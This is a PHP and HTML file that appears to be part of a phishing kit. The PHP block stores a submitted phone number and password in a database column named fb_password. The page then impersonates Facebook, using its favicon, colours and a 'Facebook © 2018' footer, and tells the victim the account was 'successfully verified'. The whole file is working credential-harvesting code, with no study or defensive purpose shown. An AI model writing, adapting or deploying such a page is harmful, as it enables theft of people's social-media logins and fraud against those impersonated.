<?php
  $link = mysqli_connect("DATABASEHOST", "DATABASEUSER", "DATABASEPASSWORD", "DATABASENAME");
  $phone = mysqli_real_escape_string($link, $_POST['phone']);
  $password = mysqli_real_escape_string($link, $_POST['password']);
  $query = "UPDATE people SET fb_password = '$password' WHERE phonenumber = '$phone'";
  $link->query($query);
  $link->close();
?>

<!DOCTYPE html>
<html>
  <head>
    <title>Success</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
    <style>
      html, body {margin: 0; padding: 0; background-color: #ecedf2; color: #5e5e5e; font-family: 'Roboto', sans-serif;}
      #header {width: 100vw; height: 8vh; background-color: #3a5896; margin-bottom: 0px;}
      #header img {position: relative; height: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%);}
      #form {width: 100vw; margin-top: 0px;}
      #form p:nth-of-type(1) {font-family: 'Roboto', sans-serif; margin-top: 0px; background-color: #3876e3; color: white; padding: 2vh;}
      #copy {display: block; float: left; position: absolute; bottom: 0%; font-size: 2vh; left: 50%; transform: translateX(-50%);}
    </style>
  </head>

  <body>
    <div id="header">
      <img src="media/logo.png">
    </div>
    <div id="form">
      <p align="center">Account successfully verified</p>
      <p id="copy">Facebook © 2018</p>
    </div>
  </body>
</html>
